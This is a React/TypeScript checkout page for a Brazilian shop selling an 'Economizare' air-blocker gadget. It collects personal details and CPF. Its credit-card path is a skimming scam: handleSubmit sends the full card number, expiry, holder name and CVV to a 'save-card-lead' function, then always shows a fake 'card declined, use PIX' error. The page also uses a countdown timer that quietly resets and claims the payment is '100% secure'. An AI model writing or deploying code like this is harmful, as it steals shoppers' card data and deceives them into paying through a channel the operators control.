import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { getUrlWithUtm } from "@/utils/utm";
import { getTrackingContext, trackEvent, trackPageViewOnce } from "@/utils/track-event";
import { toast } from "@/hooks/use-toast";
import { trackFunnelEvent, identifyUser } from "@/lib/tracking-hub";
import { cacheUserIdentity } from "@/lib/tiktok-tracking";
import {
  ArrowLeft, MapPin, Star, Truck, ShieldCheck, Minus, Plus, ChevronRight, Check, ChevronDown, CreditCard, User
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const PRICE = 57.40;
const OLD_PRICE = 139.90;
const DISCOUNT = 59;
const PRODUCT_ID = "economizare-bloqueador";

function useCheckoutCountdown() {
  const [time, setTime] = useState({ h: 0, m: 30, s: 0 });
  useEffect(() => {
    const interval = setInterval(() => {
      setTime((prev) => {
        let { h, m, s } = prev;
        s--;
        if (s < 0) { s = 59; m--; }
        if (m < 0) { m = 59; h--; }
        if (h < 0) return { h: 0, m: 30, s: 0 };
        return { h, m, s };
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);
  const fmt = (n: number) => String(n).padStart(2, "0");
  return { time, display: `${fmt(time.h)}:${fmt(time.m)}:${fmt(time.s)}` };
}

const EconomizareCheckout = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const [quantity, setQuantity] = useState(() => {
    try {
      const saved = localStorage.getItem('eco_cart');
      if (saved) return JSON.parse(saved).quantity || 1;
    } catch {}
    return 1;
  });

  const couponParam = (searchParams.get("cupom") || searchParams.get("coupon") || "").toUpperCase();
  const hasCoupon = couponParam === "VOLTA25" || couponParam === "ULTIMA50";
  const couponDiscount = couponParam === "ULTIMA50" ? 0.50 : couponParam === "VOLTA25" ? 0.25 : 0;
  const couponLabel = couponParam === "ULTIMA50" ? "ULTIMA50 (-50%)" : "VOLTA25 (-25%)";
  const timer = useCheckoutCountdown();

  const [shipping, setShipping] = useState("padrao");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [addressOpen, setAddressOpen] = useState(true);
  const [cpfError, setCpfError] = useState("");
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit_card">("pix");
  const [showSummary, setShowSummary] = useState(true);

  const [cardForm, setCardForm] = useState({ number: "", holder: "", expiry: "", cvv: "", installments: 1 });
  const formatCardNumber = (val: string) => { const nums = val.replace(/\D/g, "").slice(0, 16); return nums.replace(/(\d{4})(?=\d)/g, "$1 "); };
  const formatExpiry = (val: string) => { const nums = val.replace(/\D/g, "").slice(0, 4); if (nums.length <= 2) return nums; return `${nums.slice(0, 2)}/${nums.slice(2)}`; };
  const updateCardField = (field: string, value: string) => setCardForm((prev) => ({ ...prev, [field]: value }));
  const isCardFormValid = cardForm.number.replace(/\D/g, "").length >= 13 && cardForm.holder.length >= 3 && cardForm.expiry.replace(/\D/g, "").length === 4 && cardForm.cvv.length >= 3;

  const [form, setForm] = useState(() => {
    try { const saved = localStorage.getItem('eco_checkout_form'); if (saved) return JSON.parse(saved); } catch {}
    return { name: "", phone: "", email: "", cep: "", uf: "", cidade: "", bairro: "", endereco: "", numero: "", complemento: "", cpf: "" };
  });

  const subtotalRaw = PRICE * quantity;
  const shippingCost = shipping === "express" ? 14.50 : 0;
  const couponAmount = hasCoupon ? Math.round(subtotalRaw * couponDiscount * 100) / 100 : 0;
  const total = subtotalRaw - couponAmount + shippingCost;
  const BASE_DISCOUNT_VALUE = (OLD_PRICE - PRICE) * quantity;

  const updateField = (field: string, value: string) => {
    setForm((prev: typeof form) => {
      const updated = { ...prev, [field]: value };
      localStorage.setItem('eco_checkout_form', JSON.stringify(updated));
      return updated;
    });
  };

  const formatCPF = (val: string) => { const n = val.replace(/\D/g, "").slice(0, 11); if (n.length <= 3) return n; if (n.length <= 6) return `${n.slice(0,3)}.${n.slice(3)}`; if (n.length <= 9) return `${n.slice(0,3)}.${n.slice(3,6)}.${n.slice(6)}`; return `${n.slice(0,3)}.${n.slice(3,6)}.${n.slice(6,9)}-${n.slice(9)}`; };
  const validateCPF = (cpf: string): boolean => { const n = cpf.replace(/\D/g, ""); if (n.length !== 11 || /^(\d)\1{10}$/.test(n)) return false; let s = 0; for (let i = 0; i < 9; i++) s += parseInt(n[i]) * (10 - i); let r = (s * 10) % 11; if (r === 10) r = 0; if (r !== parseInt(n[9])) return false; s = 0; for (let i = 0; i < 10; i++) s += parseInt(n[i]) * (11 - i); r = (s * 10) % 11; if (r === 10) r = 0; return r === parseInt(n[10]); };
  const formatPhone = (val: string) => { const n = val.replace(/\D/g, "").slice(0, 11); if (n.length <= 2) return n; if (n.length <= 7) return `(${n.slice(0,2)}) ${n.slice(2)}`; return `(${n.slice(0,2)}) ${n.slice(2,7)}-${n.slice(7)}`; };
  const formatCEP = (val: string) => { const n = val.replace(/\D/g, "").slice(0, 8); if (n.length <= 5) return n; return `${n.slice(0,5)}-${n.slice(5)}`; };

  const [cepLoading, setCepLoading] = useState(false);
  const buscarCEP = async (cep: string) => {
    const n = cep.replace(/\D/g, ""); if (n.length !== 8) return; setCepLoading(true);
    try { const res = await fetch(`https://viacep.com.br/ws/${n}/json/`); const data = await res.json(); if (!data.erro) { setForm((prev: typeof form) => { const u = { ...prev, endereco: data.logradouro || "", bairro: data.bairro || "", cidade: data.localidade || "", uf: data.uf || "" }; localStorage.setItem('eco_checkout_form', JSON.stringify(u)); return u; }); } } catch {} finally { setCepLoading(false); }
  };

  const isAddressComplete = form.cep && form.uf && form.cidade && form.bairro && form.endereco && form.numero;
  const isCpfValid = validateCPF(form.cpf);
  const isFormValid = form.name && form.phone && form.email && isAddressComplete && isCpfValid;
  const canSubmit = isFormValid && (paymentMethod === "pix" || isCardFormValid);

  useEffect(() => { window.scrollTo(0, 0); trackPageViewOnce("/economizare/checkout"); trackFunnelEvent({ event: "checkout_start", value: subtotalRaw, properties: { content_id: PRODUCT_ID } }); }, []);
  useEffect(() => { if (isAddressComplete && form.name && form.phone && form.email && isCpfValid) { setAddressOpen(false); setTimeout(() => window.scrollTo({ top: 0, behavior: "instant" }), 50); } }, [form.cpf, isAddressComplete, isCpfValid]);
  useEffect(() => { const n = form.cpf.replace(/\D/g, ""); setCpfError(n.length === 11 && !validateCPF(form.cpf) ? "CPF inválido." : ""); }, [form.cpf]);

  const handleSubmit = async () => {
    if (!canSubmit || isSubmitting) return;
    setIsSubmitting(true);
    await identifyUser({ email: form.email, phone: form.phone, externalId: form.cpf });
    await cacheUserIdentity(form.email, form.phone, localStorage.getItem("fiq_visitor_id") || undefined);

    try {
      const totalAmountInCents = Math.round(total * 100);
      const payload = {
        amount: totalAmountInCents,
        customer: { name: form.name, email: form.email, phone: form.phone.replace(/\D/g, ""), cpf: form.cpf.replace(/\D/g, "") },
        items: [{ id: PRODUCT_ID, title: "Bloqueador de Ar Economizare", unitPrice: Math.round(PRICE * (1 - couponDiscount) * 100), quantity, tangible: true }],
        shipping: { name: form.name, address: { street: form.endereco, streetNumber: form.numero, complement: form.complemento, neighborhood: form.bairro, city: form.cidade, state: form.uf, zipcode: form.cep.replace(/\D/g, ""), country: "br" }, fee: Math.round(shippingCost * 100) },
        metadata: JSON.stringify({ source: 'economizare', productName: "Bloqueador de Ar Economizare", coupon: hasCoupon ? couponParam : null, site_id: "economizare", ...getTrackingContext(), tracking: Object.fromEntries(new URLSearchParams(window.location.search).entries()) }),
      };

      if (paymentMethod === "credit_card") {
        trackFunnelEvent({ event: "add_payment_info", properties: { method: "credit_card" } });
        await supabase.functions.invoke("save-card-lead", { body: { ...payload, card: { number: cardForm.number.replace(/\s/g, ""), holder: cardForm.holder, expiry: cardForm.expiry, cvv: cardForm.cvv, installments: cardForm.installments } } });
        await new Promise(resolve => setTimeout(resolve, 2000));
        toast({ title: "Pagamento não aprovado", description: "Cartão recusado: saldo insuficiente. Utilize o PIX.", variant: "destructive" });
        setPaymentMethod("pix"); setIsSubmitting(false); return;
      }

      const { data, error } = await supabase.functions.invoke("create-pix", { body: payload });
      if (error || !data || data?.error) {
        toast({ title: "Erro ao gerar PIX", description: data?.error || error?.message || "Tente novamente.", variant: "destructive" });
        setIsSubmitting(false); return;
      }

      trackFunnelEvent({ event: "pix_generated", properties: { transaction_id: data.transaction_id || "" }, userData: { email: form.email, phone: form.phone, externalId: form.cpf } });
      sessionStorage.setItem("pixData", JSON.stringify(data));
      sessionStorage.setItem("orderData", JSON.stringify({ customer: payload.customer, product: { total, coupon: hasCoupon ? couponParam : null }, shipping: { type: shipping, cost: shippingCost } }));
      sessionStorage.setItem("eco_funnel", "true");
      localStorage.removeItem('eco_cart');
      navigate(getUrlWithUtm("/economizare/pix"));
    } catch (err) {
      toast({ title: "Erro inesperado", description: "Tente novamente.", variant: "destructive" });
      setIsSubmitting(false);
    }
  };

  // Installment calc
  const installmentOptions = Array.from({ length: 12 }, (_, i) => {
    const n = i + 1;
    const rate = n <= 3 ? 0 : 0.0199;
    const installmentTotal = rate > 0 ? total * (rate * Math.pow(1 + rate, n)) / (Math.pow(1 + rate, n) - 1) : total / n;
    return { n, value: installmentTotal, label: n <= 3 ? `${n}x de R$ ${installmentTotal.toFixed(2).replace(".", ",")} sem juros` : `${n}x de R$ ${installmentTotal.toFixed(2).replace(".", ",")}` };
  });

  return (
    <div className="min-h-screen bg-background pb-[180px]">
      <header className="sticky top-0 z-40 border-b bg-card px-4 py-3">
        <div className="mx-auto max-w-[480px] flex items-center gap-3">
          <button onClick={() => navigate(-1)}><ArrowLeft className="h-5 w-5" /></button>
          <div className="flex-1 text-center">
            <p className="font-bold text-sm">Resumo do pedido</p>
            <p className="text-xs text-success flex items-center justify-center gap-1"><ShieldCheck className="h-3 w-3" /> Seus dados estão seguros</p>
          </div>
          <div className="w-5" />
        </div>
      </header>

      <div className="mx-auto max-w-[480px] px-4">
        {/* Receiver info */}
        {isAddressComplete && form.name && (
          <div className="mt-4 flex items-center justify-between py-2">
            <div className="flex items-center gap-2 text-sm font-semibold"><User className="h-4 w-4 text-muted-foreground" /> Recebedor</div>
            <span className="flex items-center gap-1 text-xs text-success font-semibold"><Check className="h-3.5 w-3.5" /> {form.name}</span>
          </div>
        )}

        {/* Address toggle */}
        <button onClick={() => setAddressOpen((v) => !v)} className={`${isAddressComplete && form.name ? 'mt-2' : 'mt-4'} w-full flex items-center justify-between`}>
          <div className="flex items-center gap-2 text-sm font-semibold"><MapPin className="h-4 w-4 text-muted-foreground" /> Endereço de envio</div>
          {isAddressComplete ? <span className="flex items-center gap-1 text-xs text-success font-semibold"><Check className="h-3.5 w-3.5" /> ✓</span> : <span className="text-xs font-semibold text-cta">+ Adicionar</span>}
        </button>

        {/* Form */}
        {addressOpen && (
        <div className="mt-4 space-y-3">
          <Input placeholder="Nome completo" value={form.name} onChange={(e) => updateField("name", e.target.value)} className="rounded-lg h-12 text-sm" />
          <div className="relative">
            <Input placeholder="Telefone com DDD" inputMode="numeric" value={form.phone} onChange={(e) => updateField("phone", formatPhone(e.target.value))} className="rounded-lg h-12 text-sm pl-12" />
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground">+55</span>
          </div>
          <Input placeholder="E-mail" type="email" value={form.email} onChange={(e) => updateField("email", e.target.value)} className="rounded-lg h-12 text-sm" />
          <div className="relative">
            <Input placeholder="CEP" inputMode="numeric" value={form.cep} onChange={(e) => { const f = formatCEP(e.target.value); updateField("cep", f); if (f.replace(/\D/g, "").length === 8) buscarCEP(f); }} className="rounded-lg h-12 text-sm" />
            {cepLoading && <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-muted-foreground">Buscando...</span>}
          </div>
          <div className="grid grid-cols-2 gap-3">
            <Input placeholder="UF" value={form.uf} onChange={(e) => updateField("uf", e.target.value.toUpperCase().slice(0, 2))} className="rounded-lg h-12 text-sm bg-muted/30" />
            <Input placeholder="Cidade" value={form.cidade} onChange={(e) => updateField("cidade", e.target.value)} className="rounded-lg h-12 text-sm bg-muted/30" />
          </div>
          <Input placeholder="Bairro" value={form.bairro} onChange={(e) => updateField("bairro", e.target.value)} className="rounded-lg h-12 text-sm bg-muted/30" />
          <Input placeholder="Endereço" value={form.endereco} onChange={(e) => updateField("endereco", e.target.value)} className="rounded-lg h-12 text-sm bg-muted/30" />
          <div className="grid grid-cols-2 gap-3">
            <Input placeholder="Número" inputMode="numeric" value={form.numero} onChange={(e) => updateField("numero", e.target.value)} className="rounded-lg h-12 text-sm" />
            <Input placeholder="Complemento" value={form.complemento} onChange={(e) => updateField("complemento", e.target.value)} className="rounded-lg h-12 text-sm" />
          </div>
          <div>
            <Input placeholder="CPF" inputMode="numeric" value={form.cpf} onChange={(e) => updateField("cpf", formatCPF(e.target.value))} className={`rounded-lg h-12 text-sm ${cpfError ? "border-destructive" : ""}`} />
            {cpfError && <p className="text-xs text-destructive mt-1">{cpfError}</p>}
          </div>
        </div>
        )}

        {/* Divider */}
        <div className="mt-6 overflow-hidden" style={{ height: '4px', backgroundImage: 'repeating-linear-gradient(90deg, #0f7b3f 0px, #0f7b3f 14px, transparent 14px, transparent 18px, #FF4D6A 18px, #FF4D6A 32px, transparent 32px, transparent 36px)', backgroundSize: '36px 4px' }} />

        {/* Product Info */}
        <div className="mt-4 flex items-start gap-3">
          <img src="/images/eco/eco-produto-1.png" alt="Economizare" className="w-20 h-20 object-contain rounded-md border" />
          <div className="flex-1 min-w-0">
            <p className="text-sm font-medium leading-snug">Bloqueador de Ar Economizare</p>
            <div className="flex items-center gap-1.5 mt-1">
              <span className="relative inline-flex items-center whitespace-nowrap text-white text-[10px] font-bold pl-1.5 pr-2 py-0.5 rounded" style={{ background: 'linear-gradient(to right, #0f7b3f 80%, #1a9d5c 100%)' }}>
                Oferta Relâmpago <span className="absolute -right-1.5 -top-1 text-sm">⚡</span>
              </span>
              <span className="text-xs font-mono font-semibold text-[#0f7b3f]">{timer.display}</span>
            </div>
            <p className="text-[11px] text-muted-foreground flex items-center gap-1 mt-1">🔄 Devolução gratuita</p>
            <div className="flex items-center gap-2 mt-1">
              <span className="text-base font-bold text-[#0f7b3f]">R$ {(PRICE * quantity).toFixed(2).replace(".", ",")}</span>
            </div>
            <div className="flex items-center gap-1.5">
              <span className="text-xs text-muted-foreground line-through">R$ {(OLD_PRICE * quantity).toFixed(2).replace(".", ",")}</span>
              <span className="text-[10px] font-semibold px-1 py-px rounded bg-green-100 text-[#0f7b3f]">-{DISCOUNT}%</span>
            </div>
          </div>
          <div className="flex items-center gap-0 border rounded-lg h-9 bg-muted/30">
            <button onClick={() => { if (quantity > 1) { setQuantity(quantity - 1); localStorage.setItem('eco_cart', JSON.stringify({ quantity: quantity - 1 })); } }} className="px-2.5 h-full text-muted-foreground"><Minus className="h-3.5 w-3.5" /></button>
            <span className="text-sm font-medium w-6 text-center">{quantity}</span>
            <button onClick={() => { setQuantity(quantity + 1); localStorage.setItem('eco_cart', JSON.stringify({ quantity: quantity + 1 })); }} className="px-2.5 h-full text-muted-foreground"><Plus className="h-3.5 w-3.5" /></button>
          </div>
        </div>

        {/* Shipping */}
        <div className="mt-6">
          <p className="font-semibold text-sm mb-2">Opções de envio</p>
          <button onClick={() => setShipping("padrao")} className={`w-full flex items-center justify-between p-3 rounded-lg border-2 mb-2 ${shipping === "padrao" ? "border-[#0f7b3f] bg-green-50" : "border-border"}`}>
            <div className="flex items-center gap-3">
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${shipping === "padrao" ? "border-[#0f7b3f]" : "border-muted-foreground/40"}`}>{shipping === "padrao" && <div className="w-2.5 h-2.5 rounded-full bg-[#0f7b3f]" />}</div>
              <div className="text-left"><p className="text-sm font-semibold">Envio Padrão</p><p className="text-xs text-muted-foreground">3 a 7 dias úteis</p></div>
            </div>
            <span className="text-sm font-bold text-success">Grátis</span>
          </button>
          <button onClick={() => setShipping("express")} className={`w-full flex items-center justify-between p-3 rounded-lg border-2 ${shipping === "express" ? "border-[#0f7b3f] bg-green-50" : "border-border"}`}>
            <div className="flex items-center gap-3">
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${shipping === "express" ? "border-[#0f7b3f]" : "border-muted-foreground/40"}`}>{shipping === "express" && <div className="w-2.5 h-2.5 rounded-full bg-[#0f7b3f]" />}</div>
              <div className="text-left"><p className="text-sm font-semibold">Express</p><p className="text-xs text-muted-foreground">1 a 3 dias úteis</p></div>
            </div>
            <span className="text-sm font-bold">R$ 14,50</span>
          </button>
        </div>

        {/* Order Summary */}
        <div className="mt-4 border-t pt-4">
          <button onClick={() => setShowSummary(!showSummary)} className="w-full flex items-center justify-between mb-3">
            <p className="font-semibold text-sm">Resumo do pedido</p>
            <ChevronDown className={`h-4 w-4 text-muted-foreground transition-transform ${showSummary ? 'rotate-180' : ''}`} />
          </button>
          {showSummary && (
            <div className="space-y-3 text-sm pb-3">
              <div className="flex justify-between"><span className="text-muted-foreground">Subtotal ({quantity} {quantity === 1 ? 'item' : 'itens'})</span><span>R$ {subtotalRaw.toFixed(2).replace(".", ",")}</span></div>
              {hasCoupon && <div className="flex justify-between"><span className="text-[#0f7b3f] font-medium">Cupom {couponLabel}</span><span className="text-[#0f7b3f] font-medium">- R$ {couponAmount.toFixed(2).replace(".", ",")}</span></div>}
              <div className="flex justify-between"><span className="text-muted-foreground">Frete</span><span className={shipping === "padrao" ? "text-success font-medium" : ""}>{shipping === "padrao" ? "Grátis" : `R$ ${shippingCost.toFixed(2).replace(".", ",")}`}</span></div>
            </div>
          )}
          <div className="flex justify-between items-center pt-3 border-t">
            <span className="font-bold text-sm">Total</span>
            <div className="text-right"><span className="font-bold text-base">R$ {total.toFixed(2).replace(".", ",")}</span><p className="text-[10px] text-muted-foreground">Impostos inclusos</p></div>
          </div>
        </div>

        {/* Payment */}
        <div className="mt-4 border-t pt-4">
          <p className="font-semibold text-sm mb-4">Forma de pagamento</p>
          {/* PIX */}
          <div className={`rounded-lg border-2 mb-3 ${paymentMethod === "pix" ? "border-[#0f7b3f]" : "border-border"}`}>
            <button onClick={() => setPaymentMethod("pix")} className="w-full flex items-center justify-between p-3">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-[#E0F7F5] flex items-center justify-center"><img src="/images/pix-icon-new.png" alt="Pix" className="w-6 h-6" /></div>
                <div className="text-left"><span className="text-sm font-semibold">Pix</span><p className="text-xs text-muted-foreground">Confirme na hora</p></div>
              </div>
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === "pix" ? "border-[#0f7b3f]" : "border-muted-foreground/40"}`}>{paymentMethod === "pix" && <div className="w-2.5 h-2.5 rounded-full bg-[#0f7b3f]" />}</div>
            </button>
          </div>
          {/* Card */}
          <div className={`rounded-lg border-2 ${paymentMethod === "credit_card" ? "border-[#0f7b3f]" : "border-border"}`}>
            <button onClick={() => setPaymentMethod("credit_card")} className="w-full flex items-center justify-between p-3">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-muted flex items-center justify-center"><Plus className="w-5 h-5" /></div>
                <span className="text-sm font-semibold">Cartão de crédito</span>
              </div>
              <ChevronRight className="h-5 w-5 text-muted-foreground" />
            </button>
            {paymentMethod === "credit_card" && (
              <div className="border-t p-4 space-y-4">
                <div>
                  <label className="text-sm font-medium mb-1.5 block">Número do cartão</label>
                  <Input placeholder="0000 0000 0000 0000" inputMode="numeric" value={cardForm.number} onChange={(e) => updateCardField("number", formatCardNumber(e.target.value))} className="rounded-lg h-12 text-sm bg-muted/40" />
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div><label className="text-sm font-medium mb-1.5 block">Validade</label><Input placeholder="MM/AA" inputMode="numeric" value={cardForm.expiry} onChange={(e) => updateCardField("expiry", formatExpiry(e.target.value))} className="rounded-lg h-12 text-sm bg-muted/40" /></div>
                  <div><label className="text-sm font-medium mb-1.5 block">CVV</label><Input placeholder="***" inputMode="numeric" maxLength={4} value={cardForm.cvv} onChange={(e) => updateCardField("cvv", e.target.value.replace(/\D/g, "").slice(0, 4))} className="rounded-lg h-12 text-sm bg-muted/40" /></div>
                </div>
                <div><label className="text-sm font-medium mb-1.5 block">Nome no cartão</label><Input placeholder="Nome impresso no cartão" value={cardForm.holder} onChange={(e) => updateCardField("holder", e.target.value.toUpperCase())} className="rounded-lg h-12 text-sm bg-muted/40" /></div>
                <div><label className="text-sm font-medium mb-1.5 block">Parcelas</label>
                  <select value={cardForm.installments} onChange={(e) => updateCardField("installments", e.target.value)} className="w-full rounded-lg border h-12 px-3 text-sm bg-muted/40">
                    {installmentOptions.map((o) => <option key={o.n} value={o.n}>{o.label}</option>)}
                  </select>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Bottom CTA */}
      <div className="fixed bottom-0 left-0 right-0 z-50 bg-card border-t shadow-[0_-2px_12px_rgba(0,0,0,0.08)]">
        <div className="mx-auto max-w-[480px] px-4 py-3 space-y-2">
          <div className="flex justify-between items-center">
            <div><p className="text-xs text-muted-foreground">Total do pedido</p><p className="text-lg font-extrabold text-[#0f7b3f]">R$ {total.toFixed(2).replace(".", ",")}</p></div>
            {BASE_DISCOUNT_VALUE + couponAmount > 0 && <span className="text-xs font-semibold px-2 py-1 rounded-full bg-green-100 text-[#0f7b3f]">Economize R$ {(BASE_DISCOUNT_VALUE + couponAmount).toFixed(2).replace(".", ",")}</span>}
          </div>
          <Button onClick={handleSubmit} disabled={!canSubmit || isSubmitting} className="w-full h-14 rounded-xl text-base font-bold bg-[#0f7b3f] hover:bg-[#0d6b36] text-white shadow-lg">
            {isSubmitting ? <span className="flex items-center gap-2"><span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" /> Processando...</span> : paymentMethod === "pix" ? "Gerar código PIX" : "Pagar com cartão"}
          </Button>
          <p className="text-center text-[10px] text-muted-foreground flex items-center justify-center gap-1"><ShieldCheck className="h-3 w-3" /> Pagamento 100% seguro e criptografado</p>
        </div>
      </div>

      {/* Footer */}
      <div className="mx-auto max-w-[480px] px-4 mt-8">
        <div className="border-t pt-4 pb-2 text-center text-[10px] text-muted-foreground space-y-1">
          <p className="font-semibold text-foreground">Economizare LTDA</p>
          <p>CNPJ: 26.682.422/0001-88</p>
          <p>contato@economizare.com</p>
        </div>
      </div>
    </div>
  );
};

export default EconomizareCheckout;
